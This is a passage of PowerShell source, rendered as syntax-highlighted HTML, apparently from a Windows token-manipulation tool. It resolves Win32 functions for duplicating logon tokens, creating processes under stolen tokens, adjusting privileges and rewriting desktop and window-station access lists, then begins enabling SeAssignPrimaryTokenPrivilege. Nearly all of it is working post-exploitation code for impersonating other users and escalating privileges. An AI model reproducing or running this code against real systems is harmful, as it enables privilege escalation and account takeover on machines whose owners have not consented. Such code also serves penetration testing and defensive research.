    <span class="token variable">$LsaGetLogonSessionDataDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[UInt32]</span><span class="token punctuation">)</span>
    <span class="token variable">$LsaGetLogonSessionData</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$LsaGetLogonSessionDataAddr</span><span class="token punctuation">,</span> <span class="token variable">$LsaGetLogonSessionDataDelegate</span><span class="token punctuation">)</span>

    <span class="token variable">$CreateProcessWithTokenWAddr</span> = Get<span class="token operator">-</span>ProcAddress advapi32<span class="token punctuation">.</span>dll CreateProcessWithTokenW
    <span class="token variable">$CreateProcessWithTokenWDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[Bool]</span><span class="token punctuation">)</span>
    <span class="token variable">$CreateProcessWithTokenW</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$CreateProcessWithTokenWAddr</span><span class="token punctuation">,</span> <span class="token variable">$CreateProcessWithTokenWDelegate</span><span class="token punctuation">)</span>

    <span class="token variable">$memsetAddr</span> = Get<span class="token operator">-</span>ProcAddress msvcrt<span class="token punctuation">.</span>dll memset
    <span class="token variable">$memsetDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[Int32]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">)</span>
    <span class="token variable">$memset</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$memsetAddr</span><span class="token punctuation">,</span> <span class="token variable">$memsetDelegate</span><span class="token punctuation">)</span>

    <span class="token variable">$DuplicateTokenExAddr</span> = Get<span class="token operator">-</span>ProcAddress advapi32<span class="token punctuation">.</span>dll DuplicateTokenEx
    <span class="token variable">$DuplicateTokenExDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[Bool]</span><span class="token punctuation">)</span>
    <span class="token variable">$DuplicateTokenEx</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$DuplicateTokenExAddr</span><span class="token punctuation">,</span> <span class="token variable">$DuplicateTokenExDelegate</span><span class="token punctuation">)</span>

    <span class="token variable">$LookupAccountSidWAddr</span> = Get<span class="token operator">-</span>ProcAddress advapi32<span class="token punctuation">.</span>dll LookupAccountSidW
    <span class="token variable">$LookupAccountSidWDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[Bool]</span><span class="token punctuation">)</span>
    <span class="token variable">$LookupAccountSidW</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$LookupAccountSidWAddr</span><span class="token punctuation">,</span> <span class="token variable">$LookupAccountSidWDelegate</span><span class="token punctuation">)</span>

    <span class="token variable">$CloseHandleAddr</span> = Get<span class="token operator">-</span>ProcAddress kernel32<span class="token punctuation">.</span>dll CloseHandle
    <span class="token variable">$CloseHandleDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[Bool]</span><span class="token punctuation">)</span>
    <span class="token variable">$CloseHandle</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$CloseHandleAddr</span><span class="token punctuation">,</span> <span class="token variable">$CloseHandleDelegate</span><span class="token punctuation">)</span>

    <span class="token variable">$LsaFreeReturnBufferAddr</span> = Get<span class="token operator">-</span>ProcAddress secur32<span class="token punctuation">.</span>dll LsaFreeReturnBuffer
    <span class="token variable">$LsaFreeReturnBufferDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[UInt32]</span><span class="token punctuation">)</span>
    <span class="token variable">$LsaFreeReturnBuffer</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$LsaFreeReturnBufferAddr</span><span class="token punctuation">,</span> <span class="token variable">$LsaFreeReturnBufferDelegate</span><span class="token punctuation">)</span>

    <span class="token variable">$OpenThreadAddr</span> = Get<span class="token operator">-</span>ProcAddress kernel32<span class="token punctuation">.</span>dll OpenThread
    <span class="token variable">$OpenThreadDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[Bool]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">)</span>
    <span class="token variable">$OpenThread</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$OpenThreadAddr</span><span class="token punctuation">,</span> <span class="token variable">$OpenThreadDelegate</span><span class="token punctuation">)</span>

    <span class="token variable">$OpenThreadTokenAddr</span> = Get<span class="token operator">-</span>ProcAddress advapi32<span class="token punctuation">.</span>dll OpenThreadToken
    <span class="token variable">$OpenThreadTokenDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[Bool]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[Bool]</span><span class="token punctuation">)</span>
    <span class="token variable">$OpenThreadToken</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$OpenThreadTokenAddr</span><span class="token punctuation">,</span> <span class="token variable">$OpenThreadTokenDelegate</span><span class="token punctuation">)</span>

    <span class="token variable">$CreateProcessAsUserWAddr</span> = Get<span class="token operator">-</span>ProcAddress advapi32<span class="token punctuation">.</span>dll CreateProcessAsUserW
    <span class="token variable">$CreateProcessAsUserWDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[Bool]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[Bool]</span><span class="token punctuation">)</span>
    <span class="token variable">$CreateProcessAsUserW</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$CreateProcessAsUserWAddr</span><span class="token punctuation">,</span> <span class="token variable">$CreateProcessAsUserWDelegate</span><span class="token punctuation">)</span>

    <span class="token variable">$OpenWindowStationWAddr</span> = Get<span class="token operator">-</span>ProcAddress user32<span class="token punctuation">.</span>dll OpenWindowStationW
    <span class="token variable">$OpenWindowStationWDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[Bool]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">)</span>
    <span class="token variable">$OpenWindowStationW</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$OpenWindowStationWAddr</span><span class="token punctuation">,</span> <span class="token variable">$OpenWindowStationWDelegate</span><span class="token punctuation">)</span>

    <span class="token variable">$OpenDesktopAAddr</span> = Get<span class="token operator">-</span>ProcAddress user32<span class="token punctuation">.</span>dll OpenDesktopA
    <span class="token variable">$OpenDesktopADelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[String]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[Bool]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">)</span>
    <span class="token variable">$OpenDesktopA</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$OpenDesktopAAddr</span><span class="token punctuation">,</span> <span class="token variable">$OpenDesktopADelegate</span><span class="token punctuation">)</span>

    <span class="token variable">$ImpersonateSelfAddr</span> = Get<span class="token operator">-</span>ProcAddress Advapi32<span class="token punctuation">.</span>dll ImpersonateSelf
    <span class="token variable">$ImpersonateSelfDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[Int32]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[Bool]</span><span class="token punctuation">)</span>
    <span class="token variable">$ImpersonateSelf</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$ImpersonateSelfAddr</span><span class="token punctuation">,</span> <span class="token variable">$ImpersonateSelfDelegate</span><span class="token punctuation">)</span>

    <span class="token variable">$LookupPrivilegeValueAddr</span> = Get<span class="token operator">-</span>ProcAddress Advapi32<span class="token punctuation">.</span>dll LookupPrivilegeValueA
    <span class="token variable">$LookupPrivilegeValueDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[String]</span><span class="token punctuation">,</span> <span class="token namespace">[String]</span><span class="token punctuation">,</span> <span class="token variable">$LUID</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[Bool]</span><span class="token punctuation">)</span>
    <span class="token variable">$LookupPrivilegeValue</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$LookupPrivilegeValueAddr</span><span class="token punctuation">,</span> <span class="token variable">$LookupPrivilegeValueDelegate</span><span class="token punctuation">)</span>

    <span class="token variable">$AdjustTokenPrivilegesAddr</span> = Get<span class="token operator">-</span>ProcAddress Advapi32<span class="token punctuation">.</span>dll AdjustTokenPrivileges
    <span class="token variable">$AdjustTokenPrivilegesDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[Bool]</span><span class="token punctuation">,</span> <span class="token variable">$TOKEN_PRIVILEGES</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[Bool]</span><span class="token punctuation">)</span>
    <span class="token variable">$AdjustTokenPrivileges</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$AdjustTokenPrivilegesAddr</span><span class="token punctuation">,</span> <span class="token variable">$AdjustTokenPrivilegesDelegate</span><span class="token punctuation">)</span>

    <span class="token variable">$GetCurrentThreadAddr</span> = Get<span class="token operator">-</span>ProcAddress kernel32<span class="token punctuation">.</span>dll GetCurrentThread
    <span class="token variable">$GetCurrentThreadDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">)</span>
    <span class="token variable">$GetCurrentThread</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$GetCurrentThreadAddr</span><span class="token punctuation">,</span> <span class="token variable">$GetCurrentThreadDelegate</span><span class="token punctuation">)</span>

    <span class="token variable">$GetSecurityInfoAddr</span> = Get<span class="token operator">-</span>ProcAddress advapi32<span class="token punctuation">.</span>dll GetSecurityInfo
    <span class="token variable">$GetSecurityInfoDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[UInt32]</span><span class="token punctuation">)</span>
    <span class="token variable">$GetSecurityInfo</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$GetSecurityInfoAddr</span><span class="token punctuation">,</span> <span class="token variable">$GetSecurityInfoDelegate</span><span class="token punctuation">)</span>

    <span class="token variable">$SetSecurityInfoAddr</span> = Get<span class="token operator">-</span>ProcAddress advapi32<span class="token punctuation">.</span>dll SetSecurityInfo
    <span class="token variable">$SetSecurityInfoDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[UInt32]</span><span class="token punctuation">)</span>
    <span class="token variable">$SetSecurityInfo</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$SetSecurityInfoAddr</span><span class="token punctuation">,</span> <span class="token variable">$SetSecurityInfoDelegate</span><span class="token punctuation">)</span>

    <span class="token variable">$GetAceAddr</span> = Get<span class="token operator">-</span>ProcAddress advapi32<span class="token punctuation">.</span>dll GetAce
    <span class="token variable">$GetAceDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">)</span>
    <span class="token variable">$GetAce</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$GetAceAddr</span><span class="token punctuation">,</span> <span class="token variable">$GetAceDelegate</span><span class="token punctuation">)</span>

    <span class="token variable">$LookupAccountSidWAddr</span> = Get<span class="token operator">-</span>ProcAddress advapi32<span class="token punctuation">.</span>dll LookupAccountSidW
    <span class="token variable">$LookupAccountSidWDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[Bool]</span><span class="token punctuation">)</span>
    <span class="token variable">$LookupAccountSidW</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$LookupAccountSidWAddr</span><span class="token punctuation">,</span> <span class="token variable">$LookupAccountSidWDelegate</span><span class="token punctuation">)</span>

    <span class="token variable">$AddAccessAllowedAceAddr</span> = Get<span class="token operator">-</span>ProcAddress advapi32<span class="token punctuation">.</span>dll AddAccessAllowedAce
    <span class="token variable">$AddAccessAllowedAceDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[Bool]</span><span class="token punctuation">)</span>
    <span class="token variable">$AddAccessAllowedAce</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$AddAccessAllowedAceAddr</span><span class="token punctuation">,</span> <span class="token variable">$AddAccessAllowedAceDelegate</span><span class="token punctuation">)</span>

    <span class="token variable">$CreateWellKnownSidAddr</span> = Get<span class="token operator">-</span>ProcAddress advapi32<span class="token punctuation">.</span>dll CreateWellKnownSid
    <span class="token variable">$CreateWellKnownSidDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[Bool]</span><span class="token punctuation">)</span>
    <span class="token variable">$CreateWellKnownSid</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$CreateWellKnownSidAddr</span><span class="token punctuation">,</span> <span class="token variable">$CreateWellKnownSidDelegate</span><span class="token punctuation">)</span>

    <span class="token variable">$SetEntriesInAclWAddr</span> = Get<span class="token operator">-</span>ProcAddress advapi32<span class="token punctuation">.</span>dll SetEntriesInAclW
    <span class="token variable">$SetEntriesInAclWDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token variable">$EXPLICIT_ACCESS</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[UInt32]</span><span class="token punctuation">)</span>
    <span class="token variable">$SetEntriesInAclW</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$SetEntriesInAclWAddr</span><span class="token punctuation">,</span> <span class="token variable">$SetEntriesInAclWDelegate</span><span class="token punctuation">)</span>

    <span class="token variable">$LocalFreeAddr</span> = Get<span class="token operator">-</span>ProcAddress kernel32<span class="token punctuation">.</span>dll LocalFree
    <span class="token variable">$LocalFreeDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">)</span>
    <span class="token variable">$LocalFree</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$LocalFreeAddr</span><span class="token punctuation">,</span> <span class="token variable">$LocalFreeDelegate</span><span class="token punctuation">)</span>

    <span class="token variable">$LookupPrivilegeNameWAddr</span> = Get<span class="token operator">-</span>ProcAddress advapi32<span class="token punctuation">.</span>dll LookupPrivilegeNameW
    <span class="token variable">$LookupPrivilegeNameWDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[Bool]</span><span class="token punctuation">)</span>
    <span class="token variable">$LookupPrivilegeNameW</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$LookupPrivilegeNameWAddr</span><span class="token punctuation">,</span> <span class="token variable">$LookupPrivilegeNameWDelegate</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true">###############################</span>


    <span class="token comment" spellcheck="true">#Used to add 64bit memory addresses</span>
    <span class="token keyword">Function</span> Add<span class="token operator">-</span>SignedIntAsUnsigned
    <span class="token punctuation">{</span>
        <span class="token keyword">Param</span><span class="token punctuation">(</span>
        <span class="token namespace">[Parameter(Position = 0, Mandatory = $true)]</span>
        <span class="token namespace">[Int64]</span>
        <span class="token variable">$Value1</span><span class="token punctuation">,</span>

        <span class="token namespace">[Parameter(Position = 1, Mandatory = $true)]</span>
        <span class="token namespace">[Int64]</span>
        <span class="token variable">$Value2</span>
        <span class="token punctuation">)</span>

        <span class="token namespace">[Byte[]</span><span class="token punctuation">]</span><span class="token variable">$Value1Bytes</span> = <span class="token namespace">[BitConverter]</span>::GetBytes<span class="token punctuation">(</span><span class="token variable">$Value1</span><span class="token punctuation">)</span>
        <span class="token namespace">[Byte[]</span><span class="token punctuation">]</span><span class="token variable">$Value2Bytes</span> = <span class="token namespace">[BitConverter]</span>::GetBytes<span class="token punctuation">(</span><span class="token variable">$Value2</span><span class="token punctuation">)</span>
        <span class="token namespace">[Byte[]</span><span class="token punctuation">]</span><span class="token variable">$FinalBytes</span> = <span class="token namespace">[BitConverter]</span>::GetBytes<span class="token punctuation">(</span><span class="token namespace">[UInt64]</span>0<span class="token punctuation">)</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Value1Bytes</span><span class="token punctuation">.</span>Count <span class="token operator">-eq</span> <span class="token variable">$Value2Bytes</span><span class="token punctuation">.</span>Count<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$CarryOver</span> = 0
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> = 0<span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">-lt</span> <span class="token variable">$Value1Bytes</span><span class="token punctuation">.</span>Count<span class="token punctuation">;</span> <span class="token variable">$i</span>+<span class="token operator">+</span><span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token comment" spellcheck="true">#Add bytes</span>
                <span class="token namespace">[UInt16]</span><span class="token variable">$Sum</span> = <span class="token variable">$Value1Bytes</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token variable">$Value2Bytes</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token variable">$CarryOver</span>

                <span class="token variable">$FinalBytes</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> = <span class="token variable">$Sum</span> <span class="token operator">-band</span> 0x00FF

                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$Sum</span> <span class="token operator">-band</span> 0xFF00<span class="token punctuation">)</span> <span class="token operator">-eq</span> 0x100<span class="token punctuation">)</span>
                <span class="token punctuation">{</span>
                    <span class="token variable">$CarryOver</span> = 1
                <span class="token punctuation">}</span>
                <span class="token keyword">else</span>
                <span class="token punctuation">{</span>
                    <span class="token variable">$CarryOver</span> = 0
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">Throw</span> <span class="token string">"Cannot add bytearrays of different sizes"</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> <span class="token namespace">[BitConverter]</span>::ToInt64<span class="token punctuation">(</span><span class="token variable">$FinalBytes</span><span class="token punctuation">,</span> 0<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>


    <span class="token comment" spellcheck="true">#Enable SeAssignPrimaryTokenPrivilege, needed to query security information for desktop DACL</span>
    <span class="token keyword">function</span> Enable<span class="token operator">-</span>SeAssignPrimaryTokenPrivilege
    <span class="token punctuation">{</span>    
        <span class="token namespace">[IntPtr]</span><span class="token variable">$ThreadHandle</span> = <span class="token variable">$GetCurrentThread</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$ThreadHandle</span> <span class="token operator">-eq</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">Throw</span> <span class="token string">"Unable to get the handle to the current thread"</span>
        <span class="token punctuation">}</span>

